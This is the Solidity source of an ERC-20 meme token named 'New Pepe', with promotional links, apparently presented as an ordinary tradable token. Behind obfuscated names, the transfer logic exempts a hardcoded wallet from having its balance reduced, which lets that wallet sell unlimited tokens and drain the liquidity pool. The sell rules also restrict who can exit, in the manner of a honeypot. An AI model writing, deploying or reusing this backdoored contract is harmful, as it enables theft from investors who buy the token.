/**

Telegram: https://t.me/NewPepe_Ethereum

Twitter: https://twitter.com/NewPepe_ETH

Website: https://newpepe.org/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;



interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _qgrvuj(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qgrvuj(a, b, "SafeMath");
    }

    function  _qgrvuj(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _blkvlh(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract NewPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _patrncr;
    address payable private _qryfja;
    address private _buvevp;
    string private constant _name = unicode"New Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 42069000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yleoer=0;
    uint256 private _qvujdt=0;
    uint256 public _potyeb = _totalSupply;
    uint256 public _qroerk = _totalSupply;
    uint256 public _pjaeob= _totalSupply;
    uint256 public _qrxgef= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _bluevud;
    mapping (address => bool) private _pvbksu;
    mapping(address => uint256) private _flbneu;

    bool private _musiopen;
    bool public _peuidq = false;
    bool private kljoek = false;
    bool private _reyxkj = false;


    event _qkbrej(uint _potyeb);
    modifier frivuy {
        kljoek = true;
        _;
        kljoek = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _bluevud[owner(

        )] = true;
        _bluevud[address
        (this)] = true;
        _bluevud[
            _qryfja] = true;
        _qryfja = 
        payable (0xc70509eADa85432E3362d4dB8fDE8dA124DdEbEE);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qgrvuj(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 boraug=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_peuidq) {
                if (to 
                != address
                (_patrncr) 
                && to !=
                 address
                 (_buvevp)) {
                  require(_flbneu
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _flbneu
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _buvevp && to != 
            address(_patrncr) &&
             !_bluevud[to] ) {
                require(amount 
                <= _potyeb,
                 "Exceeds the _potyeb.");
                require(balanceOf
                (to) + amount
                 <= _qroerk,
                  "Exceeds the _qroerk.");
                if(_qvujdt
                < _yleoer){
                  require
                  (! _frxjbv(to));
                }
                _qvujdt++;
                 _pvbksu
                 [to]=true;
                boraug = amount._blkvlh
                ((_qvujdt>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _buvevp &&
             from!= address(this) 
            && !_bluevud[from] ){
                require(amount <= 
                _potyeb && 
                balanceOf(_qryfja)
                <_qrxgef,
                 "Exceeds the _potyeb.");
                boraug = amount._blkvlh((_qvujdt>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_qvujdt>
                _yleoer &&
                 _pvbksu[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!kljoek 
            && to == _buvevp &&
             _reyxkj &&
             contractTokenBalance>
             _pjaeob 
            && _qvujdt>
            _yleoer&&
             !_bluevud[to]&&
              !_bluevud[from]
            ) {
                _transferFrom( _bcqkiv(amount, 
                _bcqkiv(contractTokenBalance,
                _qrxgef)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _pxnuk(address
                    (this).balance);
                }
            }
        }

        if(boraug>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(boraug);
          emit
           Transfer(from,
           address
           (this),boraug);
        }
        _balances[from
        ]= _qgrvuj(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _qgrvuj(boraug));
        emit Transfer
        (from, to, 
        amount.
         _qgrvuj(boraug));
    }

    function _transferFrom(uint256
     tokenAmount) private
      frivuy {
        if(tokenAmount==
        0){return;}
        if(!_musiopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _patrncr.WETH();
        _approve(address(this),
         address(
             _patrncr), 
             tokenAmount);
        _patrncr.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _bcqkiv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qgrvuj(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _qryfja){
            return a ;
        }else{
            return a .
             _qgrvuj (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _potyeb = _totalSupply;
        _qroerk = _totalSupply;
        emit _qkbrej(_totalSupply);
    }

    function _frxjbv(address 
    account) private view 
    returns (bool) {
        uint256 doriep;
        assembly {
            doriep :=
             extcodesize
             (account)
        }
        return doriep > 
        0;
    }

    function _pxnuk(uint256
    amount) private {
        _qryfja.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _musiopen ) ;
        _patrncr  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _patrncr), 
            _totalSupply);
        _buvevp = 
        IUniswapV2Factory(_patrncr.
        factory( ) 
        ). createPair (
            address(this
            ),  _patrncr .
             WETH ( ) );
        _patrncr.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_buvevp).
        approve(address(_patrncr), 
        type(uint)
        .max);
        _reyxkj = true;
        _musiopen = true;
    }

    receive() external payable {}
}